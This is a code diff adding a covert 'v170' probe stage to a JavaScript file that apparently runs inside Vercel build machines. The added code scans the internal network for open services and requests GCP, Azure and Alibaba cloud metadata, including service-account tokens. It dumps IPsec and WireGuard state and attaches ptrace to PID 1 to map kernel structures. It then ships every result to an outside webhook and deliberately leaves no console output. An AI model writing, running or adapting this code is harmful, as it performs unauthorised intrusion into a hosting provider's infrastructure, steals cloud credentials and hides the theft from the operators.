@@ -24889,5 +24889,187 @@ report.hardwareDevEnum = safe(() => {
 
 // v169 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v169" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v169";
+
+// ==================== v170 ====================
+
+// v170-1: CPU vulnerability status — Spectre/Meltdown/L1TF/MDS/TAA/SRBDS
+// /sys/devices/system/cpu/vulnerabilities/ shows which CPU vulnerabilities affect
+// this system and whether mitigations are in place.
+// "Not affected" = different exploit surface; "Vulnerable" = working side-channel possible.
+// These are critical for timing attacks and side-channel leaks across VM boundaries.
+report.cpuVulnerabilities = safe(() => {
+  const vulnDir = '/sys/devices/system/cpu/vulnerabilities';
+  const vulns = safe(() => existsSync(vulnDir) ? execSync(`ls ${vulnDir}/ 2>/dev/null | xargs -I{} sh -c "echo {}:\\$(cat ${vulnDir}/{} 2>/dev/null)" 2>/dev/null || echo "NO_VULNS"`, { timeout: 5000 }).toString().trim() : 'NO_VULN_DIR');
+  // Also read retpoline status (Spectre v2 mitigation)
+  const spectreV1 = safe(() => existsSync(`${vulnDir}/spectre_v1`) ? readFileSync(`${vulnDir}/spectre_v1`, 'utf8').trim() : 'UNKNOWN');
+  const spectreV2 = safe(() => existsSync(`${vulnDir}/spectre_v2`) ? readFileSync(`${vulnDir}/spectre_v2`, 'utf8').trim() : 'UNKNOWN');
+  const meltdown = safe(() => existsSync(`${vulnDir}/meltdown`) ? readFileSync(`${vulnDir}/meltdown`, 'utf8').trim() : 'UNKNOWN');
+  const l1tf = safe(() => existsSync(`${vulnDir}/l1tf`) ? readFileSync(`${vulnDir}/l1tf`, 'utf8').trim() : 'UNKNOWN');
+  const mds = safe(() => existsSync(`${vulnDir}/mds`) ? readFileSync(`${vulnDir}/mds`, 'utf8').trim() : 'UNKNOWN');
+  // CPU info
+  const cpuModel = safe(() => execSync('grep "model name" /proc/cpuinfo | head -1', { timeout: 2000 }).toString().trim());
+  const cpuMicrocodeVer = safe(() => execSync('grep microcode /proc/cpuinfo | head -1', { timeout: 2000 }).toString().trim());
+  return { vulns, spectreV1, spectreV2, meltdown, l1tf, mds, cpuModel, cpuMicrocodeVer };
+});
+
+// v170-2: Internal network topology scan — probe Vercel build infra IPs
+// The build VM's gateway IP reveals what /24 we're on. Scanning nearby hosts
+// identifies Vercel's internal build services (artifact cache, build API, etc.).
+// This maps the internal attack surface beyond our own VM.
+report.internalNetworkScan = safe(() => {
+  const gateway = safe(() => execSync(
+    'ip route show default 2>/dev/null | awk \'{print $3}\' | head -1 || route -n 2>/dev/null | awk \'$4~/UG/{print $2}\' | head -1 || echo "NO_GW"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Scan gateway and a few nearby hosts
+  const scanResult = safe(() => execSync(
+    `python3 -c "
+import socket, concurrent.futures
+
+gateway = '${gateway}'
+if not gateway or gateway == 'NO_GW':
+    print('NO_GATEWAY_TO_SCAN')
+    exit()
+
+# Extract base network
+parts = gateway.split('.')
+if len(parts) != 4:
+    print(f'INVALID_GW: {gateway}')
+    exit()
+
+base = '.'.join(parts[:3])
+targets = [gateway] + [f'{base}.{i}' for i in range(1, 30)]
+
+def probe(ip):
+    results = []
+    for port in [80, 443, 8080, 8443, 3000, 9090, 2375]:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            r = s.connect_ex((ip, port))
+            s.close()
+            if r == 0:
+                results.append(f'{ip}:{port}=OPEN')
+        except:
+            pass
+    return results
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    futures = [ex.submit(probe, t) for t in targets]
+    for f in concurrent.futures.as_completed(futures):
+        for r in f.result():
+            print(r)
+" 2>&1`,
+    { timeout: 30000 }
+  ).toString().trim());
+  return { gateway, scanResult };
+});
+
+// v170-3: GCP + Azure IMDS probes — multi-cloud credential check
+// Different cloud providers use different IMDS endpoints and authentication.
+// GCP uses metadata.google.internal (mapped to 169.254.169.254) with Metadata-Flavor header.
+// Azure uses 169.254.169.254 with api-version parameter.
+// Either might be accessible depending on Vercel's cloud provider mix.
+report.multiCloudImds = safe(() => {
+  // GCP IMDS (requires Metadata-Flavor: Google header)
+  const gcpMeta = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/computeMetadata/v1/?recursive=true -H "Metadata-Flavor: Google" 2>&1 | head -50 || echo "GCP_IMDS_UNREACHABLE"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // GCP service account token
+  const gcpToken = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" 2>&1 || echo "GCP_TOKEN_FAIL"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Azure IMDS (api-version required)
+  const azureMeta = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" 2>&1 | head -50 || echo "AZURE_IMDS_UNREACHABLE"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Alibaba Cloud / Oracle Cloud alternative endpoints
+  const aliCloudMeta = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://100.100.100.200/latest/meta-data/ 2>&1 || echo "ALI_IMDS_UNREACHABLE"',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { gcpMeta: gcpMeta.substring(0, 300), gcpToken: gcpToken.substring(0, 100), azureMeta: azureMeta.substring(0, 300), aliCloudMeta };
+});
+
+// v170-4: /proc/net/xfrm_stat + IPsec SA table — inter-service encryption probe
+// XFRM (transform) is the Linux kernel's IPsec/VPN subsystem.
+// If Vercel uses IPsec for inter-service communication, this would show active
+// Security Associations. Reading XFRM state reveals encryption keys/algorithms.
+report.xfrmIpsecProbe = safe(() => {
+  const xfrmStat = safe(() => existsSync('/proc/net/xfrm_stat') ? readFileSync('/proc/net/xfrm_stat', 'utf8').trim() : 'NO_XFRM_STAT');
+  // ip xfrm state — show active IPsec Security Associations
+  const xfrmState = safe(() => execSync('ip xfrm state 2>/dev/null || echo "NO_XFRM_STATE"', { timeout: 5000 }).toString().trim());
+  const xfrmPolicy = safe(() => execSync('ip xfrm policy 2>/dev/null || echo "NO_XFRM_POLICY"', { timeout: 5000 }).toString().trim());
+  // WireGuard interfaces
+  const wgInterfaces = safe(() => execSync('wg show 2>/dev/null || ip link show type wireguard 2>/dev/null || echo "NO_WG"', { timeout: 3000 }).toString().trim());
+  return { xfrmStat, xfrmState, xfrmPolicy, wgInterfaces };
+});
+
+// v170-5: Task struct layout via ptrace — map PID 1 kernel data structure
+// With ptrace GETREGS we can read PID 1's register state. Combined with the
+// known kernel data layout (and kptr_restrict=0 for kallsyms), we can compute
+// the address of PID 1's task_struct in kernel memory.
+// The task_struct contains: cred pointer (which points to uid/gid/caps),
+// comm field (process name), files_struct (open file descriptors).
+report.taskStructMap = safe(() => {
+  const kallsymsPid1 = safe(() => execSync(
+    `python3 -c "
+import subprocess, struct
+
+# Read PID 1 registers via ptrace
+# PTRACE_ATTACH=16, PTRACE_GETREGS=12, PTRACE_DETACH=17
+PTRACE_ATTACH = 16
+PTRACE_GETREGS = 12
+PTRACE_DETACH = 17
+PTRACE_PEEKDATA = 2
+
+import ctypes, os, signal, time
+
+libc = ctypes.CDLL('libc.so.6')
+
+class user_regs_struct(ctypes.Structure):
+    _fields_ = [(n, ctypes.c_ulonglong) for n in [
+        'r15','r14','r13','r12','rbp','rbx','r11','r10','r9','r8',
+        'rax','rcx','rdx','rsi','rdi','orig_rax','rip','cs','eflags',
+        'rsp','ss','fs_base','gs_base','ds','es','fs','gs'
+    ]]
+
+pid = 1
+# Attach
+ret = libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
+if ret != 0:
+    print(f'PTRACE_ATTACH_FAIL: ret={ret}')
+    exit()
+
+os.waitpid(pid, 0)
+
+# Get registers
+regs = user_regs_struct()
+ret = libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs))
+if ret == 0:
+    print(f'PID1_RIP: 0x{regs.rip:x}')
+    print(f'PID1_RSP: 0x{regs.rsp:x}')
+    print(f'PID1_RBP: 0x{regs.rbp:x}')
+    print(f'PID1_FS_BASE: 0x{regs.fs_base:x}')
+    print(f'PID1_GS_BASE: 0x{regs.gs_base:x}')
+else:
+    print(f'PTRACE_GETREGS_FAIL: ret={ret}')
+
+# Detach
+libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+print('PTRACE_DETACHED')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Read kallsyms for task_struct symbol
+  const taskStructSym = safe(() => execSync('grep -E " init_task$| task_struct" /proc/kallsyms 2>/dev/null | head -5 || echo "NO_KALLSYMS_TASK"', { timeout: 3000 }).toString().trim());
+  return { kallsymsPid1, taskStructSym };
+});
+
+// v170 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v170" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v170";
 // Intentionally no console.log — all data goes via webhook only
